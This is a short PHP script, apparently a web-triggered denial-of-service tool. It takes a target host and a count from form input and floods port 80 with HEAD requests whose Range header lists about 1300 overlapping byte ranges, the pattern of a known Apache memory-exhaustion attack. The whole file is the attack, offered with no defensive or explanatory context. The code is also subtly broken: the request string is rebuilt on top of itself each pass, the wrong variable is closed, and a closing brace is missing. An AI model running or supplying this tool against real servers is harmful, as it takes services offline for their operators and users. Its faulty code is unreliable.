<?
$p = "";
$host = $_POST['host'];
$port = 80;
$numforks = $_POST['num'];
for ($k=0;$k<1300;$k++) {
    $p .= ",5-$k";
}
for ($k=0;$k<$numforks;$k++) {
    $p = "HEAD / HTTP/1.1\r\nHost: $host\r\nRange:bytes=0-$p\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n";    
    $fp = stream_socket_client("tcp://$host:$port", $errno, $errstr, 30);
    if ($fp) { stream_socket_sendto($fp, $p, STREAM_CLIENT_ASYNC_CONNECT);
               @fclose($socket);
             }
?>
